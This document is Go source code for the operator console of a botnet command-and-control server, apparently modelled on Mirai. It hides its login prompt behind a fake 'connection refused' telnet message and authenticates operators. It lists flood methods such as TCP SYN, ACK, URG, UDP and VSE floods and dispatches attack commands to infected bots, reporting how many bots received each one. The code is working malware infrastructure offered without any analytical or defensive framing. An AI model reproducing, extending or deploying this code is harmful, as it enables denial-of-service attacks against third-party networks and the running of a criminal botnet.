package main

import (
  "fmt"
  "net"
  "time"
)

type Admin struct {
  conn  net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
  return &Admin{conn}
}

func (this *Admin) Handle() {
  this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
  defer func() {
    this.conn.Write([]byte("\033[?1049l"))
  }()

  this.conn.SetDeadline(time.Now().Add(60 * time.Second))
  this.conn.Write([]byte("telnet: Unable to connect to remote host: Connection refused\r\n"))
  this.conn.Write([]byte(""))
  username, err := this.ReadLine(false)
  if err != nil {
    return
  }

  this.conn.SetDeadline(time.Now().Add(60 * time.Second))
  this.conn.Write([]byte(""))
  password, err := this.ReadLine(false)
  if err != nil {
    return
  }

  this.conn.SetDeadline(time.Now().Add(120 * time.Second))

  var loggedIn bool
  var userInfo AccountInfo
  if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
    this.conn.Write([]byte("\r\033[00;31m\r\n"))
    buf := make([]byte, 1)
    this.conn.Read(buf)
    return
  }

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Loaded: %d | User: %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	


	this.conn.Write([]byte("\033[2J\033[1H"))

  for {
    var botCatagory string
    var botCount int
    this.conn.Write([]byte(fmt.Sprintf("\033[0m\033[31m[%s\033[97m@\033[0m\033[31mbotnet]\033[0m ", username)))   
    cmd, err := this.ReadLine(false)
 
      if userInfo.admin == 1 && cmd == "clear" || cmd == "cls" {
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\r\n"))
            continue
          }

      if userInfo.admin == 0 && cmd == "clear" || cmd == "cls" {
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\r\n"))
            continue
          }

    if err != nil || cmd == "methods" || cmd == "?" {
        this.conn.Write([]byte("\033[97mtcpsyn\033[0m\033[31m:\033[0m Tcp syn flood with options\r\n"))
        this.conn.Write([]byte("\033[97mtcpack\033[0m\033[31m:\033[0m Tcp ack flood with options\r\n"))
        this.conn.Write([]byte("\033[97mudp\033[0m\033[31m:\033[0m Generic udp flood\r\n"))
        this.conn.Write([]byte("\033[97mudprain\033[0m\033[31m:\033[0m Generic udp flood optimized\r\n"))
        this.conn.Write([]byte("\033[97murg\033[0m\033[31m:\033[0m Tcp URG flood\r\n"))
        this.conn.Write([]byte("\033[97mraw\033[0m\033[31m:\033[0m Udp flood optimized for bypassing open ports\r\n"))
        this.conn.Write([]byte("\033[97mtcp\033[0m\033[31m:\033[0m Tcp ack-syn flood\r\n"))
        this.conn.Write([]byte("\033[97mudpplain\033[0m\033[31m:\033[0m Udp flood optimized for higher pps\r\n"))
        this.conn.Write([]byte("\033[97mudpvse\033[0m\033[31m:\033[0m Vse udp flood\r\n"))
        this.conn.Write([]byte("\033[97mexit\033[0m\033[31m:\033[0m Logout of the cnc\r\n"))
        this.conn.Write([]byte("\033[97mclear\033[0m\033[31m:\033[0m Clear your screen\r\n"))
            continue
        }

        if userInfo.admin == 1 && cmd == "os -a" ||cmd == "os" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;37m%s: %d\r\n\033[0m", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\033[01;37mtotal bots: %d\r\n\033[0m", botCount)))
            continue
        }

        if err != nil || cmd == "exit" {
            return
        }
        
        if cmd == "" {
            continue
        }

        botCount = userInfo.maxBots
        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("%s\033[37m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[37m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[37m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var AttackCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        AttackCount = userInfo.maxBots
                    } else {
                        AttackCount = clientList.Count()
                    }
                    this.conn.Write([]byte(fmt.Sprintf("\033[1;93mAttack sent to %d bots.\r\n", AttackCount)))
                } else {
                     //no whitelist.
                     //his.conn.Write([]byte(f))
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
  buf := make([]byte, 500000)
  bufPos := 0

  for {
    n, err := this.conn.Read(buf[bufPos:bufPos+1])
    if err != nil || n != 1 {
    return "", err
    }
    if buf[bufPos] == '\xFF' {
    n, err := this.conn.Read(buf[bufPos:bufPos+2])
    if err != nil || n != 2 {
      return "", err
    }
    bufPos--
    } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
    if bufPos > 0 {
      this.conn.Write([]byte(string(buf[bufPos])))
      bufPos--
    }
    bufPos--
    } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
    bufPos--
    } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
    this.conn.Write([]byte("\r\n"))
    return string(buf[:bufPos]), nil
    } else if buf[bufPos] == 0x03 {
    this.conn.Write([]byte("^C\r\n"))
    return "", nil
    } else {
    if buf[bufPos] == '\033' {
      buf[bufPos] = '^';
      this.conn.Write([]byte(string(buf[bufPos])))
      bufPos++;
      buf[bufPos] = '[';
      this.conn.Write([]byte(string(buf[bufPos])))
    } else if masked {
      this.conn.Write([]byte("*"))
    } else {
      this.conn.Write([]byte(string(buf[bufPos])))
    }
    }
    bufPos++
  }
  return string(buf), nil
}
